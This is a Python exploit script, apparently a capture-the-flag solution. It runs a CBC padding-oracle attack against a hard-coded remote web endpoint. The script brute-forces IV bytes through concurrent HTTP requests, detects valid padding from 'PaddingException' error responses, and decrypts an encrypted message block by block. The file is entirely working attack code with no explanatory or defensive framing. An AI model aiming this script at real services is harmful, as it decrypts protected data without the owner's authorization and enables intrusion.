import base64
import random
import logging
import aiohttp
import asyncio
import requests

logging.basicConfig(level=logging.INFO)
URL_PREF="http://35.237.57.141:5001/03f0355e03/?post="
msg = "1azZquGGv73tMUCz0zEqG21RuJYJgqqyPUbgakNCCeXZD5xdwbIx0uIh7bSoawqwiR9dLNSt!X0RZ0AGLN38tu!Qwh9tIHfQTvZMA4JCQvj3QLu0JPKozkPYtC1azrS723NHCKFZmqrBuXHG2-Jegj9wRkI9CESo9dY7kZHwZa!OCqg9ofJTRPZ-Yx4b5x5Dcbwg9YSlwQAf1YWeLXlusQ~~"


b64d = lambda x: base64.b64decode(x.replace('~', '=').replace('!', '/').replace('-', '+'))


timeout=aiohttp.ClientTimeout(total=60)
def change_bytes(byte_arr):
    return bytes([random.randint(0, 255) ^ i for i in byte_arr])

def decrypt_xor(first,second):
    return bytes([a^b for a,b in zip(first,second)])




internal_state= [0] * 16
def get_vect_by_pad(pad):
    return bytes([i ^ pad for i in internal_state])



res=[]
async def fetch(session, i, url):
    global res
    #logging.debug("{} sended".format(i))
    async with session.get(url, timeout=timeout) as response:
        resp = await response.text()

        logging.debug("{} recv".format(i))

        cond = resp[-15:-1]
        if cond != "ddingException":  # good padding
            #logging.info("res append {}".format(i))
            res.append(i)

async def main(pad,prefix,suffix):

    logging.info("bruting {} byte".format(pad))
    tasks = []
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for i in range(0, 256):
            iv = prefix + bytes([i]) + suffix
            for_out = base64.b64encode(iv + data_for_decrypt).decode().replace("+", "%2b")

            task = asyncio.ensure_future(fetch(session, i, URL_PREF + for_out))
            tasks.append(task)

        responses = asyncio.gather(*tasks)
        await responses






if __name__ == '__main__':
    data = b64d(msg)
    data_list = [data[i:i + 32] for i in range(0, len(data) - 16+1, 16)]
    #data = data[-32:]
    res_buf = b""
    for data in data_list:
        data_for_decrypt = data[16:]
        iv_orig = data[:16]


        loop = asyncio.get_event_loop()
        internal_state = [0] * 16
        last_pad,last_state=1, [0]*16
        while last_pad!=16:
            try:
                for pad in range(last_pad, 17):

                    res=[]
                    suffix = get_vect_by_pad(pad)[16 - pad + 1:]
                    prefix = iv_orig[:16 - pad]

                    future = asyncio.ensure_future(main(pad, prefix, suffix))
                    loop.run_until_complete(future)

                    logging.info("loop ended pad: {}".format(pad))

                    while len(res) > 1:
                        for k in res:
                            iv = change_bytes(prefix[:16 - pad]) + bytes([k]) + suffix
                            for_out = base64.b64encode(iv + data_for_decrypt).decode().replace("+", "%2b")

                            resp = requests.get(URL_PREF + for_out)
                            cond = resp.text[-15:-1]
                            if cond == "ddingException":  # good padding
                                res.remove(k)

                    internal_state[16 - pad] = res[0] ^ pad
                    last_state[16-pad] = res[0] ^ pad
                    last_pad = pad
            except:
                print("err in {} pad, start with {}".format(last_pad, last_pad))

        print("result: ", decrypt_xor(iv_orig, bytes(internal_state)), get_vect_by_pad(0))
        res_buf += decrypt_xor(iv_orig, bytes(internal_state))

    print(res_buf)